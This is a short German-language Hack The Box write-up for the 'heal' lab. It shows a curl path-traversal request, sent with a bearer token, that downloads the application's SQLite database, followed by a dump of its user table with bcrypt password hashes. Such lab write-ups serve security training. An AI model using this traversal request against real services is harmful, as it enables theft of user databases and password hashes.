# DB Access

## Vorgehen

1. ```/config/database.yml```
    - Infos über die DB + die storage file
        - SQLite Version 3.8.0
        - Dev + Production DB: ```storage/development.sqlite3```
        - Test DB: ```storage/test.sqlite3```


2. ```/storage/development.sqlite3```
   - Wenn über Burp angefragt, dann bekommt man nur die binary ```.sqlite3``` Datei

![sqlite-binary.png](../../scanning/sqlite-binary.png)

3. Mit ```curl``` die Datei in geeignetem Format herunterladen

![development-db.png](../../scanning/development-db.png)
```
curl    -X GET "http://api.heal.htb/download?filename=../../storage/development.sqlite3" 
        -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE" 
        -o development-db.csv
```
### DB Structure
![db-structure.png](db-structure.png)

### DB Users
![img_1.png](user-db.png)

```
[
  {
    "id": 1,
    "email": "ralph@heal.htb",
    "password_digest": "$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG",
    "created_at": "2024-09-27 07:49:31.614858",
    "updated_at": "2024-09-27 07:49:31.614858",
    "fullname": "Administrator",
    "username": "ralph",
    "is_admin": 1
  },
  {
    "id": 2,
    "email": "homer.simpson@test.de",
    "password_digest": "$2a$12$2IP.iTIXNRMP/5jUQfsiH.2GodVn/K8tFx5e3zq75kpc7q6brLnSC",
    "created_at": "2025-04-30 13:03:04.347589",
    "updated_at": "2025-04-30 13:03:04.347589",
    "fullname": "Homer Simpson",
    "username": "homer1337",
    "is_admin": 0
  },
  {
    "id": 3,
    "email": "sdgagsd@sagddd.de",
    "password_digest": "$2a$12$EH4of7lkVdVbzcm3JB4yX.rsa3wiAqcDniAX5/gBR3K1mIGEs7NlK",
    "created_at": "2025-04-30 13:03:54.655979",
    "updated_at": "2025-04-30 13:03:54.655979",
    "fullname": "asdggsd",
    "username": "sdfsdaf",
    "is_admin": 0
  },
  {
    "id": 4,
    "email": "sadfasfd@sdga.de",
    "password_digest": "$2a$12$heBOMm2utJcaFBYZUwC23eFuD46MBN1ZZm/FqDwDl6WnGCtfPcPrC",
    "created_at": "2025-04-30 13:04:15.312298",
    "updated_at": "2025-04-30 13:04:15.312298",
    "fullname": "asdfasdf",
    "username": "asdfsadf",
    "is_admin": 0
  },
  {
    "id": 5,
    "email": "testing@w.com",
    "password_digest": "$2a$12$wE7zFIeZv/fqEq6aEnfB1OfGE.ATFZ1ItkGNkwUsXVDlkcquSFXuu",
    "created_at": "2025-04-30 13:08:57.565130",
    "updated_at": "2025-04-30 13:08:57.565130",
    "fullname": "Homer",
    "username": "ttttt",
    "is_admin": 0
  },
  {
    "id": 6,
    "email": "gsdasgadsagd@dsd.de",
    "password_digest": "$2a$12$GihueeXYok0.PmaHIptJf.JgYpgXs9oOJArXkzSqNcJQRIJWuberG",
    "created_at": "2025-04-30 13:10:30.518880",
    "updated_at": "2025-04-30 13:10:30.518880",
    "fullname": "sgadgsadgsad",
    "username": "safsdagd",
    "is_admin": 0
  },
  {
    "id": 7,
    "email": "test.q@test.net",
    "password_digest": "$2a$12$.ZXkrPrnRN8vYc84BordsOwE/RCvG9blUQhvZld5HW8PnBCi1xBQK",
    "created_at": "2025-04-30 13:15:14.374746",
    "updated_at": "2025-04-30 13:15:14.374746",
    "fullname": "Test",
    "username": "testinger",
    "is_admin": 0
  },
  {
    "id": 8,
    "email": "antony@heal.htb",
    "password_digest": "$2a$12$fUwM7TOxJ3o3dXL446L99eQhpCTJmx/d43l0pnzIecV.zLBrlP.8i",
    "created_at": "2025-04-30 17:10:58.543804",
    "updated_at": "2025-04-30 17:10:58.543804",
    "fullname": "antony",
    "username": "Password1234",
    "is_admin": 0
  },
  {
    "id": 9,
    "email": "test77@heal.htb",
    "password_digest": "$2a$12$SXtwlpEIy2ve/e2Hwyo77O7g4.D.lGa05ZpiuP7Vg3EsQwT.6667O",
    "created_at": "2025-04-30 17:24:18.948612",
    "updated_at": "2025-04-30 17:24:18.948612",
    "fullname": "test77",
    "username": "test77",
    "is_admin": 0
  }
]
```
---
